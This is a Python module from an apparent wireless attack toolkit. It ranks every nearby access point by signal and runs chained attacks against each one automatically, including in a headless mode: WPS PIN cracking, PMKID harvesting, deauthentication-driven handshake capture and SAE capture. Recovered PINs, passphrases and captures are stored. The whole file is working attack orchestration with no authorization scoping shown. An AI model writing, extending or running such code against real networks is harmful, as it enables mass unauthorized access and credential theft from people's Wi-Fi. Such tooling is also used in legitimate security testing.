"""Batch attacks: ordered multi-target plans plus the runner that executes them.

Per AP the chain is WPS -> PMKID -> handshake capture (deauth-assisted),
skipping anything already solved (``vault.has_psk``) or ineligible. The
engine is UI-agnostic: the scanner drives it in a worker, ``--auto`` drives
it headless. Progress goes to ``log``; structured events go to ``session``
as JSON lines when given.
"""
from __future__ import annotations

import asyncio
import json
import time
from collections.abc import Callable
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from airscope.campaigns.campaign import Campaign
from airscope.campaigns.deauth import DeauthCampaign
from airscope.campaigns.pin import WpsCampaign
from airscope.campaigns.pmkid import PmkidHarvestAttack
from airscope.campaigns.sae import SaeCampaign
from airscope.persist.config import Config
from airscope.ui.capture_events import CaptureEventDetector, CaptureKind

STEP_WPS = "wps"
STEP_PMKID = "pmkid"
STEP_HANDSHAKE = "handshake"
STEP_SAE = "sae"

STEP_TIMEOUTS = {STEP_WPS: 300.0, STEP_PMKID: 120.0, STEP_HANDSHAKE: 300.0, STEP_SAE: 600.0}
POLL_S = 0.5


@dataclass
class BatchStep:
    """One attack against one AP."""

    bssid: str
    ssid: Optional[str]
    kind: str
    timeout: float


@dataclass
class StepResult:
    """Terminal outcome of one step (or an AP-level skip)."""

    bssid: str
    ssid: Optional[str]
    kind: str
    outcome: str
    detail: str = ""
    seconds: float = 0.0


def _signal(ap) -> int:
    sig = getattr(ap, "signal", None)
    return sig if isinstance(sig, int) else -100


def build_plan(aps, vault) -> tuple[list[BatchStep], list[StepResult]]:
    """Order APs strongest-first; emit steps plus immediate skip results.

    Skips: solved (known PSK), silenced, or no applicable attack. Per AP the
    chain is WPS -> PMKID -> handshake -> SAE, each gated on eligibility and
    vault state (already-have-PMKID/handshake/SAE shortens the chain).
    """
    steps: list[BatchStep] = []
    skipped: list[StepResult] = []
    for ap in sorted(aps, key=_signal, reverse=True):
        ssid = getattr(ap, "ssid", None)
        if vault.has_psk(ap):
            skipped.append(StepResult(ap.bssid, ssid, "solved", "skipped", "PSK already known"))
            continue
        if Config.is_silenced(ap.bssid):
            skipped.append(StepResult(ap.bssid, ssid, "silenced", "skipped", "AP silenced"))
            continue
        kinds: list[str] = []
        if (WpsCampaign.visible(ap) and WpsCampaign.ineligible_reason(ap) is None
                and not vault.has_wps_psk(ap)):
            kinds.append(STEP_WPS)
        if (PmkidHarvestAttack.visible(ap) and PmkidHarvestAttack.ineligible_reason(ap) is None
                and not vault.has_pmkid(ap)):
            kinds.append(STEP_PMKID)
        if (DeauthCampaign.visible(ap) and DeauthCampaign.ineligible_reason(ap) is None
                and not vault.has_handshake(ap)):
            kinds.append(STEP_HANDSHAKE)
        if (SaeCampaign.visible(ap) and SaeCampaign.ineligible_reason(ap) is None
                and not vault.has_sae(ap)):
            kinds.append(STEP_SAE)
        if not kinds:
            skipped.append(StepResult(ap.bssid, ssid, "none", "no-attack",
                                      "No applicable attack for this AP"))
            continue
        for kind in kinds:
            steps.append(BatchStep(ap.bssid, ssid, kind, STEP_TIMEOUTS[kind]))
    return steps, skipped


@dataclass
class BatchSummary:
    """Everything a batch run produced, in execution order."""

    results: list[StepResult] = field(default_factory=list)
    started: float = 0.0
    ended: float = 0.0

    @property
    def solved(self) -> int:
        """Steps that recovered a credential or capture."""
        return sum(1 for r in self.results if r.outcome in ("solved", "captured"))

    def as_dict(self) -> dict:
        return {"started": self.started, "ended": self.ended,
                "results": [r.__dict__ for r in self.results]}


class BatchRunner:
    """Executes a plan sequentially (the radio mutex allows one campaign)."""

    def __init__(self, array, vault, log: Optional[Callable[[str], None]] = None,
                 timeouts: Optional[Dict[str, float]] = None,
                 session=None) -> None:
        self.array = array
        self.vault = vault
        self.log = log or (lambda _m: None)
        self.timeouts = {**STEP_TIMEOUTS, **(timeouts or {})}
        self.session = session
        self._detector = CaptureEventDetector(granular_eapol=False)
        self._stop_requested = False

    def request_stop(self) -> None:
        """Stop after the current step (Shift+B in the scanner, SIGINT in --auto)."""
        self._stop_requested = True

    def _emit(self, event: dict) -> None:
        if self.session is not None:
            event = {"t": time.time(), **event}
            self.session.write(json.dumps(event) + "\n")

    def _ap_dict(self, ap) -> dict:
        """JSON-safe scan snapshot of one AP (plus its client MACs)."""
        clients = getattr(self.array, "clients", None) or {}
        return {
            "bssid": ap.bssid, "ssid": getattr(ap, "ssid", None),
            "channel": getattr(ap, "channel", 0) or 0,
            "signal": _signal(ap),
            "encryption": getattr(ap, "encryption", None) or "Unknown",
            "akms": list(getattr(ap, "akms", None) or []),
            "clients": [mac for mac, c in clients.items()
                        if (getattr(c, "bssid", None) or "").lower() == ap.bssid.lower()],
        }

    def _drain(self, ap) -> None:
        """Save handshake/PMKID detector hits (mirrors the scanner screen)."""
        forged = self.array.forged_macs
        for ev in self._detector.poll(ap, forged_macs=forged):
            if ev.kind == CaptureKind.HANDSHAKE:
                self.vault.save_handshake(ap, ev.client_mac)
            elif ev.kind == CaptureKind.PMKID:
                self.vault.save_pmkid(ap, ev.client_mac)

    def _live_ap(self, bssid: str, fallback):
        """Fresh registry object for this step (rows mutate between steps)."""
        try:
            return self.array.access_points[bssid]
        except (KeyError, AttributeError, TypeError):
            return fallback

    async def run(self, steps: list[BatchStep], aps) -> BatchSummary:
        """Run every step in order; always stops the campaign it started."""
        by_bssid = {ap.bssid: ap for ap in aps}
        summary = BatchSummary(started=time.time())
        self._emit({"event": "inventory", "aps": [self._ap_dict(ap) for ap in aps]})
        total = len(steps)
        for i, step in enumerate(steps):
            if self._stop_requested:
                break
            ap = self._live_ap(step.bssid, by_bssid.get(step.bssid))
            self.log(f"[{i + 1}/{total}] {step.kind} on {step.ssid or step.bssid}")
            self._emit({"event": "step_start", "step": step.__dict__, "index": i})
            result = await self._run_step(step, ap)
            summary.results.append(result)
            self._emit({"event": "step_end", "result": result.__dict__})
            self.log(f"[{i + 1}/{total}] {step.kind} on {step.ssid or step.bssid}: "
                     f"{result.outcome}" + (f" ({result.detail})" if result.detail else ""))
        summary.ended = time.time()
        self._emit({"event": "summary", "summary": summary.as_dict()})
        return summary

    def _start_campaign(self, kind: str, ap):
        """Construct + claim the radio for one step (None when busy)."""
        log = self.log
        if kind == STEP_WPS:
            camp = WpsCampaign(self.array, ap, log=log)
        elif kind == STEP_PMKID:
            camp = PmkidHarvestAttack(self.array, ap, log=log)
        elif kind == STEP_SAE:
            camp = SaeCampaign(self.array, ap, log=log)
        else:
            camp = DeauthCampaign(self.array, ap, log=log)
        return camp if camp.run() else None

    async def _run_step(self, step: BatchStep, ap) -> StepResult:
        started = time.time()
        timeout = self.timeouts.get(step.kind, STEP_TIMEOUTS[step.kind])
        camp = self._start_campaign(step.kind, ap)
        if camp is None:
            return StepResult(step.bssid, step.ssid, step.kind, "failed", "Radio busy", 0.0)
        try:
            while time.time() - started < timeout and not self._stop_requested:
                if camp.done:
                    break
                hit = self._check_hit(step.kind, camp, ap)
                if hit is not None:
                    return StepResult(step.bssid, step.ssid, step.kind, *hit,
                                      seconds=round(time.time() - started, 1))
                self._drain(ap)
                await asyncio.sleep(POLL_S)
            self._drain(ap)
            hit = self._check_hit(step.kind, camp, ap)
            if hit is not None:
                return StepResult(step.bssid, step.ssid, step.kind, *hit,
                                  seconds=round(time.time() - started, 1))
            if self._stop_requested:
                return StepResult(step.bssid, step.ssid, step.kind, "timeout",
                                  "Stopped by user",
                                  seconds=round(time.time() - started, 1))
            return StepResult(step.bssid, step.ssid, step.kind, "timeout",
                              f"No result in {timeout:.0f}s",
                              seconds=round(time.time() - started, 1))
        finally:
            await camp.stop()

    def _check_hit(self, kind: str, camp, ap) -> Optional[tuple[str, str]]:
        """(outcome, detail) when this step already won, else None."""
        if kind == STEP_WPS:
            pin, psk = self._wps_found(camp, ap)
            if pin and psk:
                ap.wps_pin, ap.wps_pin_psk = pin, psk
                self.vault.save_wps_pin(ap, pin, psk)
                return "solved", f"WPS PIN {pin}"
            if self.vault.has_wps_psk(ap):
                return "solved", "WPS PSK saved"
            return None
        if kind == STEP_PMKID:
            if getattr(camp, "pmkid", None):
                self.vault.save_pmkid(camp.target, camp.client_mac)
                return "captured", "PMKID"
            if self.vault.has_pmkid(ap):
                return "captured", "PMKID already saved"
            return None
        if kind == STEP_SAE:
            if self.vault.has_sae(ap):
                return "captured", "SAE already saved"
            if getattr(camp, "pairs", None):
                self.vault.save_sae(ap, camp.frames_for_pcap())
                return "captured", f"SAE ({len(camp.pairs)} pairs)"
            return None
        if self.vault.has_handshake(ap) or getattr(camp, "captured", False):
            return "captured", "Handshake"
        return None

    @staticmethod
    def _wps_found(camp, ap) -> tuple[Optional[str], Optional[str]]:
        """(pin, psk) recovered by a WPS campaign, else (None, None)."""
        state = getattr(camp, "state", None)
        pin = getattr(state, "found_pin", None)
        psk = getattr(state, "found_psk", None)
        if pin and psk:
            return pin, psk
        if getattr(ap, "wps_pin_psk", None):
            return getattr(ap, "wps_pin", None), ap.wps_pin_psk
        return None, None
